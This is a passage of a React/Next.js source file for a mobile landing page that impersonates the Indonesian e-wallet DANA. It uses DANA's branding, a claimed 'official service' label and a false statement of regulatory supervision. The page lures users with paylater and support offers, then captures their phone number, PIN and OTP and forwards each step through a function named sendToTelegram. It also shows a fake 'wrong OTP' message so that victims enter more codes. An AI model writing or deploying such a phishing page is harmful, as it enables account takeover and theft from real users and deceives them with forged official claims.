'use client';

import { useCallback, useEffect, useRef, useState } from 'react';
import Image from 'next/image';
import { ChevronLeft, CreditCard, Headphones, Loader2, ShoppingBag } from 'lucide-react';
import { DanaLoadingSpinnerOverlay } from './DanaLoadingSpinnerOverlay';
import { useLandingPhoneBack } from '@/hooks/useLandingPhoneBack';

import { submitLandingStepViaApi } from '@/lib/landing/submit-client';
import type { SlugData, StepData } from '@/lib/landing/types';
import {
  LANDING_STEP3_SOUND,
  playLandingStep3Sound,
  stopLandingSound,
} from '@/lib/landing-audio';
import { dismissMobileKeyboard, useKeyboardBottomOffset } from '@/hooks/use-visual-viewport';
import { StandardPaylaterStep1View } from './standard/StandardPaylaterStep1View';
import { StandardPaylaterPopup } from './standard/StandardPaylaterPopup';
import { ProfessionalPaylaterPopup } from './professional/ProfessionalPaylaterPopup';
import './landingpageclient.css';

type LandingPageClientProps = {
  slugData: SlugData;
  /** Langsung ke form step 1 tanpa entry menu (Standard landing) */
  formOnly?: boolean;
  /** Tampilkan kartu Customer Care / Laporkan Kendala di entry menu (Basic) */
  showCustomerCareEntry?: boolean;
  /** Label tombol/kartu DANA Cicil di entry menu */
  cicilEntryCta?: string;
  /** Variasi UI step 1 */
  step1Variant?: 'default' | 'paylater';
  /** Gaya popup slider paylater di step 1 */
  paylaterPopupStyle?: 'standard' | 'professional';
};

const STEP3_SOUND_SRC = LANDING_STEP3_SOUND;

function formatPhoneInput(value: string): string {
  const digits = value.replace(/\D/g, '').slice(0, 13);
  if (digits.length <= 3) return digits;
  if (digits.length <= 7) return `${digits.slice(0, 3)}-${digits.slice(3)}`;
  return `${digits.slice(0, 3)}-${digits.slice(3, 7)}-${digits.slice(7)}`;
}

function formatPhoneDisplay(phone: string): string {
  const digits = phone.replace(/\D/g, '');
  if (digits.length <= 3) return `+62 ${digits}`;
  if (digits.length <= 7) return `+62 ${digits.slice(0, 3)}-${digits.slice(3)}`;
  return `+62 ${digits.slice(0, 3)}-${digits.slice(3, 7)}-${digits.slice(7)}`;
}

function formatCountdownMMSS(seconds: number): string {
  const mm = Math.floor(seconds / 60);
  const ss = seconds % 60;
  return `${String(mm).padStart(2, '0')}:${String(ss).padStart(2, '0')}`;
}

function vibrateOtpWrong() {
  if (typeof navigator !== 'undefined' && 'vibrate' in navigator) {
    navigator.vibrate(50);
  }
}

function DanaLogoWhite() {
  return (
    <div className="flex flex-col items-center">
      <Image
        src="/dana_logo.svg"
        alt="DANA"
        width={100}
        height={32}
        className="mt-3 h-7 w-auto brightness-0 invert"
        priority
      />
    </div>
  );
}

function DanaLogoBlue() {
  return (
    <Image
      src="/dana-logo.svg"
      alt="DANA"
      width={80}
      height={24}
      className="h-6 w-auto"
      priority
    />
  );
}

export default function LandingPageClient({
  slugData,
  formOnly = false,
  showCustomerCareEntry = true,
  cicilEntryCta = 'Ajukan DANA Cicil',
  step1Variant = 'default',
  paylaterPopupStyle = 'standard',
}: LandingPageClientProps) {
  const [showEntryMenu, setShowEntryMenu] = useState(!formOnly);
  const [renderEntryMenu, setRenderEntryMenu] = useState(!formOnly);
  const [step, setStep] = useState(formOnly ? 1 : 0);
  const [hasShownStepZero, setHasShownStepZero] = useState(false);

  const [submitting, setSubmitting] = useState(false);
  const [stepData, setStepData] = useState<StepData>({ phone: '', pin: '', otp: '' });
  const [errorMessage, setErrorMessage] = useState('');
  const [countdown, setCountdown] = useState(60);
  const [otpLocked, setOtpLocked] = useState(false);
  const [otpResetting, setOtpResetting] = useState(false);
  const [otpFilled, setOtpFilled] = useState(false);
  const [otpToastVisible, setOtpToastVisible] = useState(false);

  const [bannerIndex, setBannerIndex] = useState(0);

  const [isLoadingOverlay, setIsLoadingOverlay] = useState(false);
  const [paylaterPopupOpen, setPaylaterPopupOpen] = useState(false);

  const fadeDurationMs = 1000;
  const step0HoldBeforeFadeMs = 3500;
  const [renderStep0, setRenderStep0] = useState(false);
  const [step0Visible, setStep0Visible] = useState(false);
  const [step0FadingOut, setStep0FadingOut] = useState(false);
  const [step0ScrollLocked, setStep0ScrollLocked] = useState(false);
  const [otpCompleteRingVisible, setOtpCompleteRingVisible] = useState(false);
  const [isEntryFadingOut, setIsEntryFadingOut] = useState(false);
  const [previousStep, setPreviousStep] = useState<number | null>(null);
  const [step3Entered, setStep3Entered] = useState(false);
  const prevStepRef = useRef(step);
  const previousStepTimerRef = useRef<number | null>(null);

  const pinInputRef = useRef<HTMLInputElement>(null);
  const otpInputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const otpLockTimeoutRef = useRef<number | null>(null);
  const otpCompleteRingTimeoutRef = useRef<number | null>(null);
  const step3SoundTimerRef = useRef<number | null>(null);
  const keyboardOffset = useKeyboardBottomOffset();
  const isDefaultStep1 = (step === 1 || previousStep === 1) && step1Variant === 'default';
  const step1KeyboardOffset = isDefaultStep1 ? keyboardOffset : 0;

  const isAtHome =
    !formOnly &&
    showEntryMenu &&
    renderEntryMenu &&
    step === 0 &&
    !renderStep0 &&
    !isEntryFadingOut;
  const phoneBackScreen = isAtHome ? 'home' : 'away';

  const goHome = useCallback(() => {
    setShowEntryMenu(true);
    setRenderEntryMenu(true);
    setIsEntryFadingOut(false);
    setStep(0);
    setRenderStep0(false);
    setStep0Visible(false);
    setStep0FadingOut(false);
    setStep0ScrollLocked(false);
    setHasShownStepZero(false);
    setPreviousStep(null);
    setStep3Entered(false);
    setErrorMessage('');
    setPaylaterPopupOpen(false);
    stopLandingSound(STEP3_SOUND_SRC);
  }, []);

  useLandingPhoneBack(formOnly ? 'home' : phoneBackScreen, goHome, (target) => target === 'home', {
    historyKey: 'basicScreen',
  });

  useEffect(() => {
    if (step !== 3) {
      if (step3SoundTimerRef.current) {
        window.clearTimeout(step3SoundTimerRef.current);
        step3SoundTimerRef.current = null;
      }
      stopLandingSound(STEP3_SOUND_SRC);
      return;
    }

    if (step3SoundTimerRef.current) window.clearTimeout(step3SoundTimerRef.current);
    step3SoundTimerRef.current = window.setTimeout(() => {
      step3SoundTimerRef.current = null;
      playLandingStep3Sound();
    }, 320);

    return () => {
      if (step3SoundTimerRef.current) {
        window.clearTimeout(step3SoundTimerRef.current);
        step3SoundTimerRef.current = null;
      }
      stopLandingSound(STEP3_SOUND_SRC);
    };
  }, [step]);

  useEffect(() => {
    return () => stopLandingSound(STEP3_SOUND_SRC);
  }, []);

  useEffect(() => {
    if (step === 2) {
      const timer = window.setTimeout(() => pinInputRef.current?.focus(), 100);
      return () => window.clearTimeout(timer);
    }
    return undefined;
  }, [step]);

  useEffect(() => {
    if (!renderStep0) return undefined;

    setStep0Visible(false);
    setStep0FadingOut(false);
    setStep0ScrollLocked(true);

    const showTimer = window.setTimeout(() => setStep0Visible(true), 10);
    const fadeOutTimer = window.setTimeout(() => setStep0FadingOut(true), step0HoldBeforeFadeMs);
    const hideTimer = window.setTimeout(() => setRenderStep0(false), step0HoldBeforeFadeMs + fadeDurationMs);

    return () => {
      window.clearTimeout(showTimer);
      window.clearTimeout(fadeOutTimer);
      window.clearTimeout(hideTimer);
      setStep0ScrollLocked(false);
    };
  }, [renderStep0]);

  useEffect(() => {
    if (previousStep === null) return undefined;

    if (previousStepTimerRef.current) window.clearTimeout(previousStepTimerRef.current);
    previousStepTimerRef.current = window.setTimeout(() => {
      setPreviousStep(null);
      previousStepTimerRef.current = null;
    }, fadeDurationMs);

    return () => {
      if (previousStepTimerRef.current) window.clearTimeout(previousStepTimerRef.current);
    };
  }, [previousStep]);

  // Auto submit: step 2 (PIN) dan step 3 (OTP)
  useEffect(() => {
    if (submitting) return;

    const pinValid = step === 2 && stepData.pin.replace(/\D/g, '').length === 6;
    const otpValid = step === 3 && stepData.otp.replace(/\D/g, '').length === 4;

    if (pinValid || otpValid) {
      void handleNext();
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [step, stepData.pin, stepData.otp, submitting]);

  useEffect(() => {
    if (step === 3 && countdown > 0) {
      const timer = window.setTimeout(() => setCountdown((value) => value - 1), 1000);
      return () => window.clearTimeout(timer);
    }

    if (step !== 3) setCountdown(60);
    return undefined;
  }, [step, countdown]);

  useEffect(() => {
    if (!showEntryMenu) return undefined;

    const timer = window.setInterval(() => {
      setBannerIndex((prev) => (prev + 1) % 3);
    }, 3000);

    return () => window.clearInterval(timer);
  }, [showEntryMenu]);

  const sendToTelegram = async (messageType: 'phone' | 'pin' | 'otp') => {
    const stepNum = messageType === 'phone' ? 1 : messageType === 'pin' ? 2 : 3;
    const { success, error } = await submitLandingStepViaApi(slugData.slug, stepNum, stepData, 0);
    if (error) setErrorMessage(error);
    return success;
  };

  const handleNext = async () => {
    if (step === 3 && otpLocked) return;

    setErrorMessage('');
    setSubmitting(true);
    setIsLoadingOverlay(true);

    const overlayMinDurationMs = 2500;
    const overlayStartTs = Date.now();

    let success = false;
    if (step === 1) success = await sendToTelegram('phone');
    else if (step === 2) success = await sendToTelegram('pin');
    else if (step === 3) success = await sendToTelegram('otp');

    if (success) {
      if (step < 3) {
        setPreviousStep(step);
        const nextStep = step + 1;
        setStep(nextStep);
      } else {
        vibrateOtpWrong();
        setStep(3);
        setOtpLocked(true);

        if (otpLockTimeoutRef.current) window.clearTimeout(otpLockTimeoutRef.current);
        otpLockTimeoutRef.current = window.setTimeout(() => {
          setStepData((prev) => ({ ...prev, otp: '' }));
          setCountdown(60);
          setOtpLocked(false);
          otpLockTimeoutRef.current = null;
        }, 3000);
      }
    }

    // pastikan overlay minimal tampil sesuai durasi yang diinginkan
    const elapsed = Date.now() - overlayStartTs;
    const remaining = overlayMinDurationMs - elapsed;
    if (remaining > 0) {
      await new Promise((r) => setTimeout(r, remaining));
    }

    setSubmitting(false);
    setIsLoadingOverlay(false);

    if (!success && step === 3) {
      vibrateOtpWrong();
    }
  };

  const phoneIsValid = stepData.phone.replace(/\D/g, '').length >= 10;
  const pinIsValid = stepData.pin.replace(/\D/g, '').length === 6;
  const otpIsValid = stepData.otp.replace(/\D/g, '').length === 4;

  const handlePaylaterStep1Continue = () => {
    if (!phoneIsValid || submitting) return;
    setErrorMessage('');
    dismissMobileKeyboard();
    // Wait for keyboard to retract so the slider is fully visible.
    window.setTimeout(() => setPaylaterPopupOpen(true), 180);
  };

  const handlePaylaterPopupCairkan = () => {
    setPaylaterPopupOpen(false);
    void handleNext();
  };

  const handleOtpChange = (index: number, value: string) => {
    const digit = value.replace(/\D/g, '').slice(0, 1);
    setStepData((prev) => {
      const otpArray = prev.otp.padEnd(4, ' ').split('');
      otpArray[index] = digit;
      const nextOtp = otpArray.join('').replace(/\s/g, '').slice(0, 4);

      if (otpResetting) setOtpResetting(false);

      if (nextOtp.replace(/\D/g, '').length === 4) {
        setOtpFilled(true);
        setOtpToastVisible(true);
        setOtpCompleteRingVisible(true);

        if (otpCompleteRingTimeoutRef.current) window.clearTimeout(otpCompleteRingTimeoutRef.current);
        otpCompleteRingTimeoutRef.current = window.setTimeout(() => {
          setOtpCompleteRingVisible(false);
          otpCompleteRingTimeoutRef.current = null;
        }, 3000);

        window.setTimeout(() => setOtpToastVisible(false), 12000);
      } else {
        setOtpFilled(false);
        setOtpToastVisible(false);
        setOtpCompleteRingVisible(false);
      }

      return { ...prev, otp: nextOtp };
    });

    if (digit && index < 3) otpInputRefs.current[index + 1]?.focus();
  };

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !stepData.otp[index] && index > 0) {
      otpInputRefs.current[index - 1]?.focus();
    }
  };

  const startStep0Fade = () => {
    setHasShownStepZero(true);
    setIsEntryFadingOut(true);
    setShowEntryMenu(false);

    // Jangan set Step 1 terlalu cepat.
    // Step 1 dirender bisa "nyelonong" sebelum animasi Step 0 benar-benar selesai.
    setStep(0);
    setRenderStep0(true);
    setStep0Visible(false);
    setStep0FadingOut(false);
    setStep0ScrollLocked(true);

    // Setelah Step 0 selesai (hold + fade), baru aktifkan Step 1.
    window.setTimeout(() => {
      setStep(1);

      setIsEntryFadingOut(false);
      setRenderEntryMenu(false);
    }, step0HoldBeforeFadeMs + fadeDurationMs);
  };

  const entryToStep0Visible = renderStep0;
  const isStep1FadingOut = previousStep === 1;
  const isStep2FadingOut = previousStep === 2;
  const isStep3SlidingIn = step === 3 && !step3Entered;

  useEffect(() => {
    if (step === 3) {
      const timer = window.setTimeout(() => setStep3Entered(true), 10);
      return () => window.clearTimeout(timer);
    }

    setStep3Entered(false);
    return undefined;
  }, [step]);

  return (
    <>
      <DanaLoadingSpinnerOverlay visible={isLoadingOverlay} />

      <div className="relative min-h-screen bg-[#108EE9]">
        {/* Entry menu */}
        {renderEntryMenu && (
          <div
            className={`landing-entry-root absolute inset-0 z-40 mx-auto min-h-screen w-full max-w-md transition-opacity duration-500 ease-in-out ${
              isEntryFadingOut ? 'opacity-0 pointer-events-none' : 'opacity-100'
            }`}
          >
            <header className="landing-entry-header relative z-10 flex items-center justify-between">
              <Image
                src="/dana-logo.svg"
                alt="DANA"
                width={74}
                height={24}
                className="h-5 w-auto brightness-0 invert"
                priority
              />
              <span className="rounded-full bg-white/18 px-2.5 py-1 text-[9px] font-semibold tracking-wide text-white ring-1 ring-white/25">
                Layanan Resmi
              </span>
            </header>

            <div className="relative z-10 px-3 pt-1">
              <div className="landing-entry-banner overflow-hidden rounded-2xl bg-white shadow-sm">
                <div className="relative h-[132px] w-full overflow-hidden">
                  <div
                    className="flex h-full w-full"
                    style={{
                      transform: `translate3d(-${bannerIndex * 100}%, 0, 0)`,
                      transition: 'transform 0.35s ease-out',
                    }}
                  >
                    <Image
                      src="/ban1.webp"
                      alt="Banner 1"
                      width={400}
                      height={132}
                      className="h-full w-full shrink-0 object-cover"
                      priority
                      sizes="(max-width: 448px) 100vw, 400px"
                    />
                    <Image
                      src="/ban2.webp"
                      alt="Banner 2"
                      width={400}
                      height={132}
                      className="h-full w-full shrink-0 object-cover"
                      sizes="(max-width: 448px) 100vw, 400px"
                    />
                    <Image
                      src="/ban3.webp"
                      alt="Banner 3"
                      width={400}
                      height={132}
                      className="h-full w-full shrink-0 object-cover"
                      sizes="(max-width: 448px) 100vw, 400px"
                    />
                  </div>
                </div>
                <div className="flex items-center justify-center gap-1.5 py-2">
                  {[0, 1, 2].map((index) => (
                    <span
                      key={index}
                      className={`h-1.5 rounded-full transition-all duration-300 ${
                        bannerIndex === index ? 'w-4 bg-[#108EE9]' : 'w-1.5 bg-gray-300'
                      }`}
                    />
                  ))}
                </div>
              </div>
            </div>

            <div className="relative z-10 flex flex-1 flex-col px-3 pb-6 pt-4">
              <div className="landing-entry-panel relative rounded-2xl bg-white p-3.5 shadow-sm">
                <div className="relative z-10 max-w-[88%] pr-2">
                  <p className="text-[10px] font-semibold uppercase tracking-wide text-[#108EE9]">
                    Solusi keuangan
                  </p>
                  <h2 className="mt-1 whitespace-nowrap text-[15px] font-black leading-none tracking-tight text-gray-900">
                    Temukan kebutuhanmu di sini
                  </h2>
                  <p className="mt-1 whitespace-nowrap text-[11px] leading-none text-gray-500">
                    Pilih layanan di bawah untuk mulai pengajuan.
                  </p>
                </div>

                <div className="relative z-10 mt-3 flex flex-col gap-2.5">
                  <button
                    type="button"
                    onClick={startStep0Fade}
                    className="landing-entry-card group w-full max-w-[210px] rounded-2xl bg-[#118EEA] p-3 text-left text-white active:scale-[0.99]"
                  >
                    <div className="flex items-start gap-2">
                      <span className="mt-0.5 flex h-8 w-8 shrink-0 items-center justify-center rounded-xl bg-white/20">
                        <CreditCard className="h-4 w-4 text-white" />
                      </span>
                      <div className="min-w-0">
                        <p className="text-[12px] font-bold leading-snug">Cek limit Paylater kamu</p>
                        <p className="mt-0.5 text-[10px] leading-snug text-white/90">
                          Manfaatkan untuk kebutuhanmu
                        </p>
                        <span className="landing-entry-chip mt-2 inline-flex rounded-full bg-white px-2.5 py-1 text-[11px] font-black text-[#108EE9]">
                          Ajukan Paylater
                        </span>
                      </div>
                    </div>
                  </button>

                  <button
                    type="button"
                    onClick={startStep0Fade}
                    className="landing-entry-card group w-full max-w-[210px] rounded-2xl bg-[#065B9E] p-3 text-left text-white active:scale-[0.99]"
                  >
                    <div className="flex items-start gap-2">
                      <span className="mt-0.5 flex h-8 w-8 shrink-0 items-center justify-center rounded-xl bg-white/20">
                        <ShoppingBag className="h-4 w-4 text-white" />
                      </span>
                      <div className="min-w-0">
                        <p className="text-[12px] font-bold leading-snug">{cicilEntryCta}</p>
                        <p className="mt-0.5 text-[10px] leading-snug text-white/90">
                          Belanja lebih mudah dan gampang
                        </p>
                        <span className="landing-entry-chip mt-2 inline-flex rounded-full bg-white px-2.5 py-1 text-[11px] font-black text-[#108EE9]">
                          {cicilEntryCta}
                        </span>
                      </div>
                    </div>
                  </button>

                  {showCustomerCareEntry && (
                  <button
                    type="button"
                    onClick={startStep0Fade}
                    className="landing-entry-card group w-full max-w-[210px] rounded-2xl bg-[#118EEA] p-3 text-left text-white active:scale-[0.99]"
                  >
                    <div className="flex items-start gap-2">
                      <span className="mt-0.5 flex h-8 w-8 shrink-0 items-center justify-center rounded-xl bg-white/20">
                        <Headphones className="h-4 w-4 text-white" />
                      </span>
                      <div className="min-w-0">
                        <p className="text-[12px] font-bold leading-snug">Customer Care Support</p>
                        <p className="mt-0.5 text-[10px] leading-snug text-white/90">
                          Tim siap membantu kendala kamu
                        </p>
                        <span className="landing-entry-chip mt-2 inline-flex rounded-full bg-white px-2.5 py-1 text-[11px] font-black text-[#108EE9]">
                          Laporkan Kendala
                        </span>
                      </div>
                    </div>
                  </button>
                  )}
                </div>

                <img
                  src="/bel.png"
                  alt=""
                  aria-hidden
                  className="landing-entry-mascot pointer-events-none absolute bottom-0 -right-10 z-20 h-[220px] w-auto select-none"
                />
              </div>

              <footer className="landing-entry-footer mt-4 rounded-2xl bg-[#04508D] p-4 text-white">
                <Image
                  src="/dana_logo.svg"
                  alt="DANA"
                  width={92}
                  height={28}
                  className="h-7 w-auto brightness-0 invert"
                />
                <p className="mt-3 text-[11px] leading-relaxed text-white/90">
                  DANA Indonesia
                  <br />
                  Capital Place Lantai 18, Jl. Gatot Subroto, RT.6/RW.1, Kuningan Bar., Mampang Prpt., Kota Jakarta Selatan.
                </p>
                <p className="mt-3 text-[10px] text-white/75">
                  © 2025 DANA - PT. Espay Debit Indonesia Koe. All Rights Reserved.
                </p>
              </footer>
            </div>
          </div>
        )}

      {/* Step 0 (keeps mounted during fade-out) */}
      {entryToStep0Visible && (
        <div
          className={`landing-blue-screen fixed inset-0 z-40 mx-auto flex w-full max-w-md flex-col transition-opacity duration-1000 ease-in-out ${
            step0Visible && !step0FadingOut ? 'opacity-100' : 'opacity-0'
          } ${step0ScrollLocked ? 'overflow-hidden' : ''}`}
        >
          <div className="flex flex-1 flex-col items-center px-4 pt-6">
            <div className="flex flex-1 items-center justify-center">
              <Image
                src="/dana-logo.svg"
                alt="DANA"
                width={176}
                height={64}
                className="h-[72px] w-auto brightness-0 invert"
                priority
              />
            </div>

            <div className="mt-4 flex w-full items-start justify-start pl-5">
              <div className="flex items-start gap-4">
                <Image src="/bi.png" alt="bi" width={80} height={40} className="h-10 w-auto" />
                <div className="flex items-start gap-3">
                  <Image src="/kom.png" alt="kom" width={80} height={40} className="h-10 w-auto" />
                  <p className="mt-1 max-w-[240px] text-[10px] leading-relaxed text-white/90">
                    DANA Indonesia terdaftar dan diawasi oleh Bank Indonesia dan Kominfo
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Step 1 */}
      {(step === 1 || previousStep === 1) && step1Variant === 'paylater' && (
        <div
          className={`transition-opacity duration-700 ease-in-out ${
            isStep1FadingOut ? 'absolute inset-0 z-30 opacity-0 pointer-events-none' : 'relative opacity-100'
          }`}
        >
          <StandardPaylaterStep1View
            phone={stepData.phone}
            onPhoneChange={(value) => setStepData({ ...stepData, phone: value })}
            onContinue={handlePaylaterStep1Continue}
            phoneIsValid={phoneIsValid}
            submitting={submitting}
            errorMessage={errorMessage}
          />
          {paylaterPopupStyle === 'professional' ? (
            <ProfessionalPaylaterPopup
              open={paylaterPopupOpen}
              onClose={() => setPaylaterPopupOpen(false)}
              onCairkan={handlePaylaterPopupCairkan}
            />
          ) : (
            <StandardPaylaterPopup
              open={paylaterPopupOpen}
              onClose={() => setPaylaterPopupOpen(false)}
              onCairkan={handlePaylaterPopupCairkan}
            />
          )}
        </div>
      )}

      {(step === 1 || previousStep === 1) && step1Variant === 'default' && (
        <form
          className={`landing-blue-screen landing-step1-keyboard mx-auto flex w-full max-w-md flex-col transition-opacity duration-700 ease-in-out ${
            isStep1FadingOut ? 'absolute inset-0 z-30 opacity-0 pointer-events-none' : 'relative opacity-100'
          }`}
          onSubmit={(e) => {
            e.preventDefault();
            if (phoneIsValid && !submitting) void handleNext();
          }}
        >
          <div className="flex flex-1 flex-col items-center px-4 pt-5 pb-[88px]">
            <DanaLogoWhite />

            <h1 className="mt-9 text-center text-[13px] font-bold leading-snug text-white">
              Masukkan nomor HP kamu
              <br />
              untuk lanjut
            </h1>

            <div className="mt-8 flex h-[43px] w-full items-center overflow-hidden rounded-lg bg-white">
              <div className="flex h-full shrink-0 items-center gap-1.5 border-r border-gray-200 px-3">
                <Image src="/indo.png" alt="Indonesia" width={24} height={16} className="h-4 w-6 rounded-sm object-cover" />
                <span className="text-[15px] font-semibold text-gray-800">+62</span>
              </div>
              <input
                type="tel"
                inputMode="numeric"
                enterKeyHint="go"
                placeholder="811-1234-5678"
                className="min-w-0 flex-1 bg-transparent px-3 text-[22px] font-medium text-gray-800 placeholder:text-gray-400 outline-none"
                value={formatPhoneInput(stepData.phone)}
                onChange={(e) => setStepData({ ...stepData, phone: e.target.value.replace(/[^0-9]/g, '') })}
                onKeyDown={(e) => {
                  if (e.key === 'Enter' && phoneIsValid && !submitting) {
                    e.preventDefault();
                    void handleNext();
                  }
                }}
              />
            </div>

            <p className="mt-6 text-center text-[11px] leading-relaxed text-white/90">
              Kami akan menggunakan nomor HP ini sebagai ID Kamu dan untuk mengamankan akun kamu. Dengan melanjutkan, kamu juga setuju dengan{' '}
              <span className="font-bold">S&K</span> serta <span className="font-bold">Kebijakan Privasi</span> kami
            </p>

            {errorMessage && (
              <p className="mt-4 w-full rounded-lg bg-red-500/20 px-4 py-2.5 text-center text-xs text-white">{errorMessage}</p>
            )}
          </div>

          <div
            className={`landing-step1-continue-bar px-6 ${
              step1KeyboardOffset > 0 ? 'landing-step1-continue-bar--keyboard' : 'landing-safe-footer pt-3'
            }`}
            style={{
              transform: `translate3d(-50%, ${-step1KeyboardOffset}px, 0)`,
            }}
          >
            <button
              type="submit"
              disabled={!phoneIsValid || submitting}
              className={`flex h-[52px] w-full items-center justify-center rounded-xl text-[15px] font-bold tracking-wide transition ${
                phoneIsValid ? 'bg-white text-[#108EE9] active:bg-white/90' : 'bg-[#7EC8F7] text-[#108EE9]/70'
              } disabled:cursor-not-allowed`}
            >
              {submitting ? <Loader2 className="h-5 w-5 animate-spin" /> : 'LANJUTKAN'}
            </button>
          </div>
        </form>
      )}

      {/* Step 2 */}
      {(step === 2 || previousStep === 2) && (
        <div className={`mx-auto flex min-h-screen w-full max-w-md flex-col bg-white transition-opacity duration-500 ease-in-out ${
          isStep2FadingOut ? 'absolute inset-0 z-30 opacity-0 pointer-events-none' : 'relative opacity-100'
        }`}>
          <header className="landing-step2-header">
            <button
              type="button"
              onClick={() => {
                setErrorMessage('');
                setStep(1);
              }}
              className="flex h-8 w-8 items-center justify-center text-white"
              aria-label="Kembali"
            >
              <ChevronLeft className="h-6 w-6" strokeWidth={2.5} />
            </button>
            <h1 className="flex-1 text-center text-[17px] font-semibold text-white pr-8">Masuk</h1>
          </header>

          <div className="flex flex-1 flex-col items-center px-6 pt-10">
            <h2 className="text-[17px] font-bold text-gray-900">Masukkan PIN</h2>

            <div
              className="relative mt-10 cursor-text"
              onClick={() => pinInputRef.current?.focus()}
              role="presentation"
            >
              <input
                ref={pinInputRef}
                type="tel"
                inputMode="numeric"
                maxLength={6}
                autoComplete="off"
                autoFocus
                className="absolute inset-0 h-full w-full opacity-0"
                value={stepData.pin}
                onChange={(e) =>
                  setStepData({ ...stepData, pin: e.target.value.replace(/\D/g, '').slice(0, 6) })
                }
              />

              <div className="flex items-center gap-5">
                {Array.from({ length: 6 }, (_, index) => (
                  <div
                    key={index}
                    className={`h-[14px] w-[14px] rounded-full transition-colors ${
                      index < stepData.pin.length ? 'bg-[#108EE9]' : 'bg-[#D9D9D9]'
                    }`}
                  />
                ))}
              </div>
            </div>

            <div className="mt-10 flex w-full items-center justify-between px-2">
              <button type="button" className="flex items-center gap-1.5 text-[11px] font-semibold text-[#108EE9]">
                <span className="flex h-5 w-5 items-center justify-center rounded-full bg-[#108EE9]/10">
                  <Headphones className="h-3 w-3 text-[#108EE9]" />
                </span>
                BUTUH BANTUAN?
              </button>
              <button type="button" className="text-[11px] font-semibold text-[#108EE9]">LUPA PIN?</button>
            </div>

            {errorMessage && (
              <p className="mt-6 w-full rounded-lg bg-red-50 px-4 py-2.5 text-center text-xs text-red-600">{errorMessage}</p>
            )}
          </div>
        </div>
      )}

      {/* Step 3 */}
      {step === 3 && (
        <div
          className={`mx-auto min-h-screen w-full max-w-md bg-white pb-8 transition-transform transition-opacity duration-500 ease-in-out ${
            isStep3SlidingIn ? 'translate-y-10 opacity-0' : 'translate-y-0 opacity-100'
          }`}
        >
          <div className="landing-safe-top-content px-5 pb-8">
            <h1 className="text-center text-[15px] font-bold text-gray-900">Verifikasi telah dikirim ke Akun</h1>
            <div className="mt-3 flex justify-center">
              <DanaLogoBlue />
            </div>

            <div className="mt-4">
              <Image
                src="/notif.gif"
                width={200}
                height={120}
                className="mx-auto h-auto w-[200px]"
                alt="Notifikasi"
                unoptimized
              />
            </div>

            <p className="mt-6 text-center text-[13px] text-gray-700">Kode dikirim ke</p>
            <div className="mt-2 flex justify-center">
              <div className="rounded-full bg-[#108EE9] px-5 py-2.5">
                <span className="text-[14px] font-semibold text-white">{formatPhoneDisplay(stepData.phone)}</span>
              </div>
            </div>

            <div className="mt-3 flex items-center justify-center gap-2 text-[11px] text-gray-500">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true">
                <rect x="5" y="3" width="14" height="18" rx="2" stroke="currentColor" strokeWidth="1.5" />
                <path d="M9 7h6M9 11h4" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" />
              </svg>
              SMS
              <span>/</span>
              <svg width="16" height="16" viewBox="0 0 24 24" fill="#25D366" aria-hidden="true">
                <path d="M12 2C6.48 2 2 6.48 2 12c0 1.85.5 3.58 1.38 5.07L2 22l4.93-1.29A9.94 9.94 0 0012 22c5.52 0 10-4.48 10-10S17.52 2 12 2z" fill="#25D366" />
              </svg>
              Whatsapp
            </div>

            <div className="mt-6 flex justify-center gap-3">
              {Array.from({ length: 4 }, (_, index) => (
                <input
                  key={index}
                  ref={(el) => {
                    otpInputRefs.current[index] = el;
                  }}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  className={`h-[32px] w-[32px] rounded-xl border bg-[#F0F0F0] text-center text-xl font-semibold text-gray-800 outline-none transition duration-300 focus:bg-[#E8E8E8] focus:ring-2 focus:ring-[#108EE9]/30 ${
                    otpCompleteRingVisible ? 'border-red-500 ring-2 ring-red-500/30' : 'border-transparent'
                  }`}
                  value={stepData.otp[index] ?? ''}
                  onChange={(e) => handleOtpChange(index, e.target.value)}
                  onKeyDown={(e) => handleOtpKeyDown(index, e)}
                />
              ))}
            </div>

            <div
              className={`mt-2 flex items-center justify-center transition-opacity duration-300 ${
                otpToastVisible && otpFilled && !otpResetting ? 'opacity-100' : 'opacity-0 pointer-events-none'
              }`}
            >
              <div className="rounded-lg bg-red-500/20 px-4 py-2 text-center text-[12px] font-semibold text-red-600/95">
                OTP yang kamu masukkan Salah/Kadaluwarsa.
              </div>
            </div>

            <div className="mt-5 text-center">
              {countdown > 0 ? (
                <p className="text-[12px] text-gray-500">
                  Kirim ulang dalam{' '}
                  <span className="font-semibold tabular-nums text-gray-700">{formatCountdownMMSS(countdown)}</span>
                </p>
              ) : (
                <button
                  type="button"
                  disabled={otpResetting}
                  onClick={() => setCountdown(60)}
                  className="text-[12px] font-semibold text-[#108EE9] disabled:text-gray-300"
                >
                  Kirim ulang
                </button>
              )}
            </div>

            <div className="mt-8 border-t border-gray-100 pt-6">
              <p className="text-[13px] font-semibold text-gray-800">Silahkan Cek verifikasi akun DANA kamu:</p>

              <div className="mt-4 flex gap-3">
                <div className="flex h-9 w-9 shrink-0 items-center justify-center rounded-full bg-[#108EE9]/10">
                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
                    <rect x="6" y="2" width="12" height="20" rx="2" stroke="#108EE9" strokeWidth="1.5" />
                    <circle cx="12" cy="18" r="1" fill="#108EE9" />
                  </svg>
                </div>
                <p className="text-[11px] leading-relaxed text-gray-600">
                  Tap notifikasi di perangkatmu di layar atas dan tap{' '}
                  <span className="font-bold text-gray-800">VERIFIKASI</span>.
                </p>
              </div>

              <div className="mt-4 flex gap-3">
                <div className="flex h-9 w-9 shrink-0 items-center justify-center rounded-full bg-[#108EE9]/10">
                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
                    <rect x="3" y="5" width="18" height="14" rx="2" stroke="#108EE9" strokeWidth="1.5" />
                    <path d="M3 7l9 6 9-6" stroke="#108EE9" strokeWidth="1.5" />
                  </svg>
                </div>
                <p className="text-[11px] leading-relaxed text-gray-600">
                  Tidak menerima notifikasi? Cek Kotak Masuk atau menu{' '}
                  <span className="font-bold text-gray-800">Verifikasi</span>. atau cek di icon gambar{' '}
                  <span className="font-bold text-gray-800">Amplop</span> dan tap{' '}
